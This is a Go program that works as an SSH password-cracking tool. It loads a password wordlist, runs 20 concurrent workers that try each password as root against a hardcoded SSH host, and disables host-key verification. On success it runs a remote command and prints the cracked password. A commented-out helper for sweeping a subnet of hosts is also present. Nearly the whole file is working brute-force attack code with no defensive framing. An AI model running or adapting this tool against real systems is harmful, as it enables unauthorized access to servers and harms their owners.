package main

import (
	"bytes"
	"fmt"
	"golang.org/x/crypto/ssh"
	"log"
	// "net"
	"bufio"
	"errors"
	"os"
	"strconv"
	"strings"
	"time"
)

var Passfile = "adminpass.txt"
var Success = false
var Password = ""
var Worker = 20
var Host = "192.168.162.128:22"
var User = "root"
var Count = 0

func connect(user, passwd, ip_port string) (*ssh.Client, error) {
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(passwd),
		},
		// HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
		// 	return nil
		// },
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Second * 3,
	}
	client, err := ssh.Dial("tcp", ip_port, config)
	return client, err
}

func PassGen(passfile string) (passlis []string, err error) {
	file, err := os.Open(passfile)
	if err != nil {
		return passlis, err
	}

	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		passlis = append(passlis, scanner.Text())
	}

	if err = scanner.Err(); err != nil {
		return passlis, err
	}
	return
}

func HostGen(host []int) (hostlis []string, err error) {
	if len(host) > 4 || len(host) < 4 {
		err = errors.New(`args: host format [192,168,1,1]`)
		return
	}
	for i := host[3] + 1; i < 255; i++ {
		host[3] = i
		hostlis = append(hostlis, strings.Join(toStr(host), "."))
	}
	return

}

func toStr(intlis []int) (ret []string) {
	for _, v := range intlis {
		s := strconv.Itoa(v)
		ret = append(ret, s)
	}
	return
}

func crack(passchan chan string, done chan bool) {
	for pass := range passchan {
		if Success {
			break
		}
		client, err := connect(User, pass, Host)
		Count += 1
		if err != nil {
			log.Printf("Password: %s connect fail\n", pass)
			continue
		}
		Success = true
		Password = pass
		fmt.Printf("Password: %s connect successful\n", pass)
		session, err := client.NewSession()
		if err != nil {
			log.Println("Failed to create session: ", err)
			break
		}
		defer session.Close()
		var b bytes.Buffer
		session.Stdout = &b
		if err := session.Run("/usr/bin/uptime"); err != nil {
			log.Println("Failed to run: " + err.Error())
			break
		}
		log.Println(b.String())
		break
	}
	done <- true
}

func main() {
	begin := time.Now()
	passlis, _ := PassGen(Passfile)
	// hostlis, _ := HostGen([]int{192, 168, 1, 1})
	passChan := make(chan string, len(passlis))
	// worker := make(chan int)
	done := make(chan bool)

	for _, v := range passlis {
		passChan <- v
	}
	close(passChan)

	for i := 0; i < Worker; i++ {
		go crack(passChan, done)
	}

	for i := 0; i < Worker; i++ {
		<-done
		if Success {
			break
		}
	}

	end := time.Now()
	if Success {
		fmt.Println("Crack Success!!!\nPassword: ", Password)
	} else {
		fmt.Println("Crack Faild!!!")
	}
	fmt.Println("Count: ", Count)
	fmt.Println("Total time:", end.Sub(begin))
}
